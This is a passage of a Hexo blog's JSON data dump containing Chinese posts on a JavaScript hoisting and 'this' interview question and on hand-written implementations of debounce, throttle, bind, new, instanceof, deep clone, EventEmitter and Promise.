1</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName(); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName(); <span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"相关链接\"><a href=\"#相关链接\" class=\"headerlink\" title=\"相关链接\"></a>相关链接</h3><ol>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=MzAwNjI5MTYyMw==&mid=2651498460&idx=1&sn=ab7433e025580f16b15ba48f81e7e907&chksm=80f1ae14b78627029edc3da2b3c6f4e4a9e0d5f442450e05debe25d0b94a67c3c0e01ce7be00&mpshare=1&scene=1&srcid=&sharer_sharetime=1588991552981&sharer_shareid=2bb1f9aa633b7a93bef080397533d2b0&exportkey=A85BTrV0JxNfJ++lzGb8tTU=&pass_ticket=LD4J1MD7GBXWreZj7+i2eqbeE9x6ynqxeR6QPJbW8ptOZX7CKzTf6gl0R48lxB9a#rd\">前端同学经常忽视的一个 JavaScript 面试题</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"变量提升、this-指向、运算符优先级问题\"><a href=\"#变量提升、this-指向、运算符优先级问题\" class=\"headerlink\" title=\"变量提升、this 指向、运算符优先级问题\"></a>变量提升、this 指向、运算符优先级问题</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">2</span>);&#125;;</span><br><span class=\"line\">Foo.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">3</span>);&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//请写出以下输出结果：</span></span><br><span class=\"line\">Foo.getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\">Foo().getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName();</span><br></pre></td></tr></table></figure>\n\n<p><strong>分析：</strong></p>\n<ul>\n<li>第一问的 <code>Foo.getName</code> 指向 Foo 函数上存储的静态属性</li>\n<li>第二问的 <code>getName</code> 指向的是 <code>function () &#123; alert (4);&#125;</code><ul>\n<li>通过 <code>var</code> 声明的变量挂载在 <code>window</code> 对象下</li>\n<li>函数 <code>function getName() &#123; alert (5);&#125;</code> 会被提升到最前面</li>\n<li>语句 <code>var getName = function () &#123; alert (4);&#125;;</code> 会先进行变量提升，值为 <code>undefined</code>，然后执行到赋值语句时 <code>getName</code> 指向 <code>function () &#123; alert (4);&#125;</code></li>\n</ul>\n</li>\n<li>第三问的 <code>Foo().getName()</code> 最终指向 <code>function () &#123; alert (1); &#125;</code><ul>\n<li><code>Foo()</code> 执行时会将 <code>getName</code> 赋值为 <code>function () &#123; alert (1); &#125;</code></li>\n<li><code>Foo()</code> 执行完成后的返回值为 <code>this</code>，此时 <code>this</code> 指向 <code>window</code></li>\n<li>相当于执行 <code>window.getName()</code></li>\n</ul>\n</li>\n<li>第四问的 <code>getName</code>，相当于执行 <code>window.getName</code></li>\n<li>第五问的 <code>new Foo.getName()</code> 相当于是 <code>new (Foo.getName)()</code></li>\n<li>第六问的 <code>new Foo().getName()</code> 相当于是 <code>(new Foo()).getName()</code></li>\n<li>第七问的 <code>new new Foo().getName()</code> 相当于是 <code>new ((new Foo()).getName)()</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---答案---</span></span><br><span class=\"line\"></span><br><span class=\"line\">Foo.getName(); <span class=\"comment\">// 2</span></span><br><span class=\"line\">getName(); <span class=\"comment\">// 4</span></span><br><span class=\"line\">Foo().getName(); <span class=\"comment\">// 1</span></span><br><span class=\"line\">getName(); <span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName(); <span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName(); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName(); <span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"相关链接\"><a href=\"#相关链接\" class=\"headerlink\" title=\"相关链接\"></a>相关链接</h3><ol>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=MzAwNjI5MTYyMw==&mid=2651498460&idx=1&sn=ab7433e025580f16b15ba48f81e7e907&chksm=80f1ae14b78627029edc3da2b3c6f4e4a9e0d5f442450e05debe25d0b94a67c3c0e01ce7be00&mpshare=1&scene=1&srcid=&sharer_sharetime=1588991552981&sharer_shareid=2bb1f9aa633b7a93bef080397533d2b0&exportkey=A85BTrV0JxNfJ++lzGb8tTU=&pass_ticket=LD4J1MD7GBXWreZj7+i2eqbeE9x6ynqxeR6QPJbW8ptOZX7CKzTf6gl0R48lxB9a#rd\">前端同学经常忽视的一个 JavaScript 面试题</a></li>\n</ol>\n"},{"title":"常见工具函数的实现原理","date":"2021-03-12T07:32:28.000Z","_content":"\n# 常见工具函数的实现原理\n\n[TOC]\n\n### 防抖函数\n\n**防抖**是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等）\n\n> 类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标\n\n```js\nfunction debounce(fn, delay = 500, immediate = false) {\n  let timer;\n\n  return function() {\n    const args = arguments;\n    const context = this;\n\n    if (immediate && !timer) {\n      fn.apply(context, args);\n    }\n\n    if (timer) {\n      clearTimeout(timer);\n    }\n\n    timer = setTimeout(() => {\n      fn.apply(context, args);\n    }, delay);\n  }\n};\n```\n\n\n### 节流函数\n\n**节流**是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件）\n\n> 类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下\n\n```js\n// throttle 节流阀 \nfunction throttle(fn, delay) { \n  let timeout; \n  let start = new Date(); \n  let threshhold = delay || 200;\n\n  return function () { \n    let context = this, \n      args = arguments, \n      curr = new Date(); \n\n    clearTimeout(timeout); //总是干掉事件回调 \n    if (curr - start >= threshhold) { \n      fn.apply(context, args); //只执行一部分方法，这些方法是在某个时间段内执行一次 \n      start = curr; \n    } else { \n      //让方法在脱离事件后也能执行一次 \n      timeout = setTimeout(function () { \n          fn.apply(context, args); \n      }, threshhold); \n    } \n  }; \n}; \n\n\n// 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 \nfunction throttle(fn, delay = 500, immediate = false) {\n  let timer;\n\n  return function() {\n    const args = arguments;\n    const context = this;\n\n    if (immediate) {\n      fn.apply(context, args);\n      immediate = false;\n    }\n\n    if (!timer) {\n      timer = setTimeout(() => {\n        fn.apply(context, args);\n        timer = null;\n      }, delay);\n    }\n  }\n};\n```\n\n### call、apply 和 bind 函数\n\n```js\nFunction.prototype.$call = function(context) {\n  context = context || window;\n  const fn = +new Date() + '' + Math.random(); // 防止同名的 key\n  context[fn] = this;\n\n  const args = [...arguments].slice(1);\n  const result = eval('context[fn](' + args.toString() +')')\n\n  delete context[fn];\n\n  return result;\n}\n\nFunction.prototype.$apply = function(context, args = []) {\n  context = context || window;\n  const fn = +new Date() + '' + Math.random(); // 防止同名的 key\n  context[fn] = this;\n\n  const result = context[fn](...args);\n\n  delete context[fn];\n\n  return result;\n}\n\n// Function.prototype.bind 方法的实现\nFunction.prototype.$bind = function (context) {\n    let self = this;\n    let args = Array.prototype.slice.call(arguments, 1);\n    let fBind = function () {\n        // 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数\n        // 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立\n        return this.apply(this instanceof fBind ? this : context, args.concat(arguments));\n    };\n    // 用于把原型链传递下去\n    fBind.prototype = Object.create(this.prototype);\n    \n    // ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去\n    // function F () {}\n    // F.prototype = this.prototype;\n    // fBind.prototype = new F();\n\n    return fBind;\n}\n```\n\n### 实现 new 操作符\n\n使用 new 操作符创建一个对象时，会进行以下步骤：\n1. 创建（或者说构造）一个全新的对象。\n2. 这个新对象会被执行 [[ 原型 ]] 连接。\n3. 这个新对象会绑定到函数调用的 this 。\n4. 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。\n\n```js\nfunction myNew(fn, ...args) {\n  // let obj = {};\n  // obj.__proto__ fn.prototype;\n  let obj = Object.create(fn.prototype);\n  let result = fn.apply(obj, ...args);\n\n  if ((result && typeof result === 'object') || typeof result === 'function')) {\n    return result;\n  }\n\n  return obj;\n}\n```\n\n### 实现 instanceof 操作符\n\n**instanceof 的原理**是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面\n\n```js\nfunction myInstanceof(left, right) {\n  let leftProp = left.__proto__;\n  let rightProp = right.prototype;\n\n  // 一直会执行循环  直到函数return\n  while (true) {\n    // 遍历到了原型链最顶层\n    if (leftProp === null) {\n      return false;\n    }\n    if (leftProp === rightProp) {\n      return true;\n    } else {\n      // 遍历赋值__proto__做对比\n      leftProp = leftProp.__proto__;\n    }\n  }\n}\n```\n\n### 实现深度拷贝\n\n```js\n// 定义一个深拷贝函数  接收目标target参数\nfunction deepClone(target) {\n    let result;\n\n    if (typeof target === 'object') { // 如果当前需要深拷贝的是一个对象的话\n      if (Array.isArray(target)) {\n        result = []; // 将result赋值为一个数组，并且执行遍历\n        for (let i in target) {\n          result.push(deepClone(target[i]))\n        }\n      } else if (target === null) {\n        result = null;\n      } else if(target.constructor === RegExp){\n        result = target;\n      } else {\n        result = {};\n        for (let i in target) {\n          result[i] = deepClone(target[i]);\n        }\n      }\n    } else { // 如果不是对象的话，就是基本数据类型，那么直接赋值\n      result = target;\n    }\n\n    return result;\n}\n```\n\n```js\n\n// 如果是基本数据类型，直接返回\n// 如果是 RegExp 或者 Date 类型，返回对应类型\n// 如果是复杂数据类型，递归。\n// 考虑循环引用的问题\nfunction deepClone(obj, hash = new WeakMap()) {\n  //递归拷贝\n  if (obj instanceof RegExp) return new RegExp(obj);\n  if (obj instanceof Date) return new Date(obj);\n  if (obj === null || typeof obj !== \"object\") {\n    //如果不是复杂数据类型，直接返回\n    return obj;\n  }\n  if (hash.has(obj)) {\n    return hash.get(obj);\n  }\n  /**\n   * 如果obj是数组，那么 obj.constructor 是 [Function: Array]\n   * 如果obj是对象，那么 obj.constructor 是 [Function: Object]\n   */\n  let t = new obj.constructor();\n  hash.set(obj, t);\n  for (let key in obj) {\n    //递归\n    if (obj.hasOwnProperty(key)) {\n      //是否是自身的属性\n      t[key] = deepClone(obj[key], hash);\n    }\n  }\n  return t;\n}\n```\n\n### EventEmitter (发布订阅模式)\n\n```js\n// 手写发布订阅模式 EventEmitter\nclass EventEmitter {\n  constructor() {\n    this.events = Object.create(null);\n  }\n\n  // 实现订阅\n  on(type, callBack) {\n    if (!this.events[type]) {\n      this.events[type] = [];\n    }\n\n    this.events[type].push(callBack);\n  }\n\n  // 删除订阅\n  off(type, callBack) {\n    if (!this.events[type]) return;\n\n    this.events[type] = this.events[type].filter(item => {\n      return item !== callBack;\n    });\n  }\n\n  // 只执行一次订阅事件\n  once(type, callBack) {\n    function fn() {\n      callBack();\n      this.off(type, fn);\n    }\n    this.on(type, fn);\n  }\n  \n  // 触发事件\n  emit(type, ...rest) {\n    if（this.events[type]）{\n      this.events[type].forEach(fn => fn.apply(this, rest))\n    }\n  }\n}\n```\n\n\n### Promise 实现\n\n```js\n// Promise 简易版实现原理\nvar Promise = function Promise(fn) {\n  var callbacks = [];\n  var state = \"pending\";\n  var value;\n  function handler(callback) {\n    if (state === \"pending\") {\n      callbacks.push(callback);\n      return;\n    }\n    var cb = state === \"fulfilled\" ? callback.fulfilledCb : callback.rejectedCb;\n    if (cb === null) {\n      // then 方法不传任何参数\n      cb = state === \"fulfilled\" ? callback.resolve : callback.reject;\n      cb(value);\n      return;\n    }\n    var ret = cb(value);\n    callback.resolve(value);\n  }\n  function execute() {\n    setTimeout(() => callbacks.map((cb) => handler(cb)), 0);\n  }\n  function resolve(val) {\n    if (val && typeof val.then === \"function\") {\n      // 判断 resolve() 中的参数是否为 promise 对象\n      val.then(resolve, reject);\n      return;\n    }\n    value = val;\n    state = \"fulfilled\";\n    execute();\n  }\n\n  function reject(val) {\n    value = val;\n    state = \"rejected\";\n    execute();\n  }\n  this.then = function (fulfilledCb, rejectedCb) {\n    return new Promise((resolve, reject) => {\n      handler({\n        fulfilledCb: fulfilledCb || null,\n        rejectedCb: rejectedCb || null,\n        resolve: resolve,\n        reject: reject,\n      });\n    });\n  };\n  fn(resolve, reject);\n};\n\nnew Promise((resolve, reject) => {\n  let num = Math.random();\n  num > 0.5 ? resolve(num) : reject(num);\n}).then(\n  (num) => console.log(num),\n  (num) => console.error(num)\n);\n```","source":"_posts/JavaScript 编程题/常见工具函数的实现原理.md","raw":"---\ntitle: 常见工具函数的实现原理\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# 常见工具函数的实现原理\n\n[TOC]\n\n### 防抖函数\n\n**防抖**是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等）\n\n> 类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标\n\n```js\nfunction debounce(fn, delay = 500, immediate = false) {\n  let timer;\n\n  return function() {\n    const args = arguments;\n    const context = this;\n\n    if (immediate && !timer) {\n      fn.apply(context, args);\n    }\n\n    if (timer) {\n      clearTimeout(timer);\n    }\n\n    timer = setTimeout(() => {\n      fn.apply(context, args);\n    }, delay);\n  }\n};\n```\n\n\n### 节流函数\n\n**节流**是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件）\n\n> 类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下\n\n```js\n// throttle 节流阀 \nfunction throttle(fn, delay) { \n  let timeout; \n  let start = new Date(); \n  let threshhold = delay || 200;\n\n  return function () { \n    let context = this, \n      args = arguments, \n      curr = new Date(); \n\n    clearTimeout(timeout); //总是干掉事件回调 \n    if (curr - start >= threshhold) { \n      fn.apply(context, args); //只执行一部分方法，这些方法是在某个时间段内执行一次 \n      start = curr; \n    } else { \n      //让方法在脱离事件后也能执行一次 \n      timeout = setTimeout(function () { \n          fn.apply(context, args); \n      }, threshhold); \n    } \n  }; \n}; \n\n\n// 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 \nfunction throttle(fn, delay = 500, immediate = false) {\n  let timer;\n\n  return function() {\n    const args = arguments;\n    const context = this;\n\n    if (immediate) {\n      fn.apply(context, args);\n      immediate = false;\n    }\n\n    if (!timer) {\n      timer = setTimeout(() => {\n        fn.apply(context, args);\n        timer = null;\n      }, delay);\n    }\n  }\n};\n```\n\n### call、apply 和 bind 函数\n\n```js\nFunction.prototype.$call = function(context) {\n  context = context || window;\n  const fn = +new Date() + '' + Math.random(); // 防止同名的 key\n  context[fn] = this;\n\n  const args = [...arguments].slice(1);\n  const result = eval('context[fn](' + args.toString() +')')\n\n  delete context[fn];\n\n  return result;\n}\n\nFunction.prototype.$apply = function(context, args = []) {\n  context = context || window;\n  const fn = +new Date() + '' + Math.random(); // 防止同名的 key\n  context[fn] = this;\n\n  const result = context[fn](...args);\n\n  delete context[fn];\n\n  return result;\n}\n\n// Function.prototype.bind 方法的实现\nFunction.prototype.$bind = function (context) {\n    let self = this;\n    let args = Array.prototype.slice.call(arguments, 1);\n    let fBind = function () {\n        // 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数\n        // 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立\n        return this.apply(this instanceof fBind ? this : context, args.concat(arguments));\n    };\n    // 用于把原型链传递下去\n    fBind.prototype = Object.create(this.prototype);\n    \n    // ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去\n    // function F () {}\n    // F.prototype = this.prototype;\n    // fBind.prototype = new F();\n\n    return fBind;\n}\n```\n\n### 实现 new 操作符\n\n使用 new 操作符创建一个对象时，会进行以下步骤：\n1. 创建（或者说构造）一个全新的对象。\n2. 这个新对象会被执行 [[ 原型 ]] 连接。\n3. 这个新对象会绑定到函数调用的 this 。\n4. 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。\n\n```js\nfunction myNew(fn, ...args) {\n  // let obj = {};\n  // obj.__proto__ fn.prototype;\n  let obj = Object.create(fn.prototype);\n  let result = fn.apply(obj, ...args);\n\n  if ((result && typeof result === 'object') || typeof result === 'function')) {\n    return result;\n  }\n\n  return obj;\n}\n```\n\n### 实现 instanceof 操作符\n\n**instanceof 的原理**是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面\n\n```js\nfunction myInstanceof(left, right) {\n  let leftProp = left.__proto__;\n  let rightProp = right.prototype;\n\n  // 一直会执行循环  直到函数return\n  while (true) {\n    // 遍历到了原型链最顶层\n    if (leftProp === null) {\n      return false;\n    }\n    if (leftProp === rightProp) {\n      return true;\n    } else {\n      // 遍历赋值__proto__做对比\n      leftProp = leftProp.__proto__;\n    }\n  }\n}\n```\n\n### 实现深度拷贝\n\n```js\n// 定义一个深拷贝函数  接收目标target参数\nfunction deepClone(target) {\n    let result;\n\n    if (typeof target === 'object') { // 如果当前需要深拷贝的是一个对象的话\n      if (Array.isArray(target)) {\n        result = []; // 将result赋值为一个数组，并且执行遍历\n        for (let i in target) {\n          result.push(deepClone(target[i]))\n        }\n      } else if (target === null) {\n        result = null;\n      } else if(target.constructor === RegExp){\n        result = target;\n      } else {\n        result = {};\n        for (let i in target) {\n          result[i] = deepClone(target[i]);\n        }\n      }\n    } else { // 如果不是对象的话，就是基本数据类型，那么直接赋值\n      result = target;\n    }\n\n    return result;\n}\n```\n\n```js\n\n// 如果是基本数据类型，直接返回\n// 如果是 RegExp 或者 Date 类型，返回对应类型\n// 如果是复杂数据类型，递归。\n// 考虑循环引用的问题\nfunction deepClone(obj, hash = new WeakMap()) {\n  //递归拷贝\n  if (obj instanceof RegExp) return new RegExp(obj);\n  if (obj instanceof Date) return new Date(obj);\n  if (obj === null || typeof obj !== \"object\") {\n    //如果不是复杂数据类型，直接返回\n    return obj;\n  }\n  if (hash.has(obj)) {\n    return hash.get(obj);\n  }\n  /**\n   * 如果obj是数组，那么 obj.constructor 是 [Function: Array]\n   * 如果obj是对象，那么 obj.constructor 是 [Function: Object]\n   */\n  let t = new obj.constructor();\n  hash.set(obj, t);\n  for (let key in obj) {\n    //递归\n    if (obj.hasOwnProperty(key)) {\n      //是否是自身的属性\n      t[key] = deepClone(obj[key], hash);\n    }\n  }\n  return t;\n}\n```\n\n### EventEmitter (发布订阅模式)\n\n```js\n// 手写发布订阅模式 EventEmitter\nclass EventEmitter {\n  constructor() {\n    this.events = Object.create(null);\n  }\n\n  // 实现订阅\n  on(type, callBack) {\n    if (!this.events[type]) {\n      this.events[type] = [];\n    }\n\n    this.events[type].push(callBack);\n  }\n\n  // 删除订阅\n  off(type, callBack) {\n    if (!this.events[type]) return;\n\n    this.events[type] = this.events[type].filter(item => {\n      return item !== callBack;\n    });\n  }\n\n  // 只执行一次订阅事件\n  once(type, callBack) {\n    function fn() {\n      callBack();\n      this.off(type, fn);\n    }\n    this.on(type, fn);\n  }\n  \n  // 触发事件\n  emit(type, ...rest) {\n    if（this.events[type]）{\n      this.events[type].forEach(fn => fn.apply(this, rest))\n    }\n  }\n}\n```\n\n\n### Promise 实现\n\n```js\n// Promise 简易版实现原理\nvar Promise = function Promise(fn) {\n  var callbacks = [];\n  var state = \"pending\";\n  var value;\n  function handler(callback) {\n    if (state === \"pending\") {\n      callbacks.push(callback);\n      return;\n    }\n    var cb = state === \"fulfilled\" ? callback.fulfilledCb : callback.rejectedCb;\n    if (cb === null) {\n      // then 方法不传任何参数\n      cb = state === \"fulfilled\" ? callback.resolve : callback.reject;\n      cb(value);\n      return;\n    }\n    var ret = cb(value);\n    callback.resolve(value);\n  }\n  function execute() {\n    setTimeout(() => callbacks.map((cb) => handler(cb)), 0);\n  }\n  function resolve(val) {\n    if (val && typeof val.then === \"function\") {\n      // 判断 resolve() 中的参数是否为 promise 对象\n      val.then(resolve, reject);\n      return;\n    }\n    value = val;\n    state = \"fulfilled\";\n    execute();\n  }\n\n  function reject(val) {\n    value = val;\n    state = \"rejected\";\n    execute();\n  }\n  this.then = function (fulfilledCb, rejectedCb) {\n    return new Promise((resolve, reject) => {\n      handler({\n        fulfilledCb: fulfilledCb || null,\n        rejectedCb: rejectedCb || null,\n        resolve: resolve,\n        reject: reject,\n      });\n    });\n  };\n  fn(resolve, reject);\n};\n\nnew Promise((resolve, reject) => {\n  let num = Math.random();\n  num > 0.5 ? resolve(num) : reject(num);\n}).then(\n  (num) => console.log(num),\n  (num) => console.error(num)\n);\n```","slug":"JavaScript 编程题/常见工具函数的实现原理","published":1,"updated":"2021-04-30T06:59:12.312Z","_id":"cko3yr636000yio6rgy80ad3l","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"常见工具函数的实现原理\"><a href=\"#常见工具函数的实现原理\" class=\"headerlink\" title=\"常见工具函数的实现原理\"></a>常见工具函数的实现原理</h1><p>[TOC]</p>\n<h3 id=\"防抖函数\"><a href=\"#防抖函数\" class=\"headerlink\" title=\"防抖函数\"></a>防抖函数</h3><p><strong>防抖</strong>是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等）</p>\n<blockquote>\n<p>类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">debounce</span>(<span class=\"params\">fn, delay = <span class=\"number\">500</span>, immediate = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> timer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (immediate &amp;&amp; !timer) &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (timer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">clearTimeout</span>(timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">    &#125;, delay);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"节流函数\"><a href=\"#节流函数\" class=\"headerlink\" title=\"节流函数\"></a>节流函数</h3><p><strong>节流</strong>是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件）</p>\n<blockquote>\n<p>类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// throttle 节流阀 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">throttle</span>(<span class=\"params\">fn, delay</span>) </span>&#123; </span><br><span class=\"line\">  <span class=\"keyword\">let</span> timeout; </span><br><span class=\"line\">  <span class=\"keyword\">let</span> start = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(); </span><br><span class=\"line\">  <span class=\"keyword\">let</span> threshhold = delay || <span class=\"number\">200</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">let</span> context = <span class=\"built_in\">this</span>, </span><br><span class=\"line\">      args = <span class=\"built_in\">arguments</span>, </span><br><span class=\"line\">      curr = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(); </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout); <span class=\"comment\">//总是干掉事件回调 </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (curr - start &gt;= threshhold) &#123; </span><br><span class=\"line\">      fn.apply(context, args); <span class=\"comment\">//只执行一部分方法，这些方法是在某个时间段内执行一次 </span></span><br><span class=\"line\">      start = curr; </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> 